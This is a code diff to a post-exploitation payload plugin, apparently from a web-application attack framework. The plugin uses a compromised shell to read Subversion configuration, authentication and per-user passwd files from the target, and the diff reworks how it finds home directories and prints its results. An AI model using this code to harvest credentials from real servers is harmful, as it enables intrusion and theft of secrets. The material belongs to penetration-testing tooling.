@@ -1,6 +1,8 @@
 import re
 import core.data.kb.knowledgeBase as kb
 from plugins.attack.payloads.base_payload import base_payload
+from core.ui.consoleUi.tables import table
+
 
 class svn_config_files(base_payload):
     '''
@@ -42,23 +44,23 @@ class svn_config_files(base_payload):
                 for file_parsed in parent_path:
                     parent_path_content = self.shell.read(file_parsed)
                     if parent_path_content:
-                        self.result.update({file_parsed:parent_path_content})
+                        self.result[ file_parsed ] = parent_path_content
                     
             path = parse_path(file_content)
             if path:
                 for file_parsed in path:
                     path_content = self.shell.read(file_parsed)
                     if path_content:
-                        self.result.update({file_parsed:path_content})
+                        self.result[ file_parsed ] = path_content
                     
             auth = parse_auth_files(file_content)
             if auth:
                 for file_parsed in auth:
                     auth_content = self.shell.read(file_parsed)
                     if auth_content:
-                        self.result.update({file_parsed:auth_content})
+                        self.result[ file_parsed ] = auth_content
             if not only_parse:
-                self.result.update({file:file_content})
+                self.result[ file ] = file_content
 
         files.append('/etc/httpd/conf.d/subversion.conf')
         files.append('/etc/httpd/conf.d/viewvc.conf')
@@ -77,8 +79,11 @@ class svn_config_files(base_payload):
         files.append('/etc/subversion/servers')
         files.append('/etc/subversion/config')
 
-        home_directory = self.exec_payload('users_name').values()
-        for directory in home_directory:
+        users_info = self.exec_payload('users')
+        
+        for user in users_info:
+            directory = users_info[user]['home']
+
             files.append(directory+'.subversion/config')
             files.append(directory+'.subversion/config_backup')
             files.append(directory+'.subversion/servers')
@@ -96,15 +101,18 @@ class svn_config_files(base_payload):
                 multi_parser(self, file, file_content, True)
     
         if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
-            user_folders = self.exec_payload('users_name').values()
-            for folder in user_folders:
+            users_info = self.exec_payload('users')
+            
+            for user in users_info:
+                home = users_info[user]['home']
+
                 for dirname in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
-                    file_content = self.shell.read(folder+dirname.lower()+'/conf/svnserve.conf')
-                    passwd_content = self.shell.read(folder+dirname.lower()+'/conf/passwd')
+                    file_content = self.shell.read(home+dirname.lower()+'/conf/svnserve.conf')
+                    passwd_content = self.shell.read(home+dirname.lower()+'/conf/passwd')
                     if file_content:
-                        multi_parser(self, folder+dirname.lower()+'/conf/svnserve.conf', file_content)
+                        multi_parser(self, home+dirname.lower()+'/conf/svnserve.conf', file_content)
                     if passwd_content:
-                        multi_parser(self, folder+dirname.lower()+'/conf/passwd', passwd_content)
+                        multi_parser(self, home+dirname.lower()+'/conf/passwd', passwd_content)
 
         
         if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
@@ -120,19 +128,23 @@ class svn_config_files(base_payload):
             file_content = self.shell.read(file)
             if file_content:
                 multi_parser(self, file, file_content)
+
         return self.result
 
     def run_read(self):
-        hashmap = self.api_read()
-        result = []
-        if hashmap:
-            result.append('SVN Config Files')
-            for file, content in hashmap.iteritems():
-                result.append('-------------------------')
-                result.append(file)
-                result.append('-------------------------')
-                result.append(content)
-        if result == [ ]:
-            result.append('SVN configuration files not found.')
-        return result
+        api_result = self.api_read()
         
+        if not api_result:
+            return 'SVN configuration files not found.'
+        else:
+            rows = []
+            rows.append( ['SVN configuration files'] ) 
+            rows.append( [] )
+            
+            for filename in api_result:
+                rows.append( [filename,] )
+                
+            result_table = table( rows )
+            result_table.draw( 80 )                    
+            return
+
